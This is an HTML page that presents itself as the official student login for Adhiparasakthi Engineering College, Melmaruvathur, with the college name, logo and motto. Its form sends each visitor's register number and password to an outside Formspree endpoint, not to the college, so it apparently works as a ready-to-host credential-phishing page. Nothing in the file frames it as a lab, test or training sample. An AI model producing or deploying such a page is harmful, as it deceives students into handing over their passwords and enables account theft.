<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>APEC Student Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:linear-gradient(135deg,#ffe6e6,#ffffff);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:400px;
    background:#fff;
    padding:30px;
    border-radius:15px;
    box-shadow:0 8px 20px rgba(0,0,0,0.25);
    text-align:center;
}

.logo{
    width:140px;
    height:140px;
    object-fit:contain;
    margin-bottom:15px;
}

h2{
    color:#b30000;
    font-size:24px;
    margin-bottom:5px;
}

h4{
    color:#666;
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:5px;
    font-size:16px;
}

input:focus{
    border:1px solid #b30000;
    outline:none;
}

button{
    width:100%;
    padding:12px;
    background:#b30000;
    color:white;
    border:none;
    border-radius:5px;
    font-size:17px;
    cursor:pointer;
}

button:hover{
    background:#8b0000;
}

.footer{
    margin-top:20px;
    color:#b30000;
    font-weight:bold;
}
</style>

</head>
<body>

<div class="container">

    <img src="logo.png" alt="College Logo" class="logo">

    <h2>Adhiparasakthi Engineering College</h2>
    <h4>Melmaruvathur</h4>

    <form action="https://formspree.io/f/mnjkorgw" method="POST">

        <input
            type="text"
            name="Register_Number"
            placeholder="Register Number"
            required>

        <input
            type="password"
            name="Password"
            placeholder="Password"
            required>

        <button type="submit">LOGIN</button>

    </form>

    <p class="footer">Study | Spirituality | Service</p>

</div>

</body>
</html>
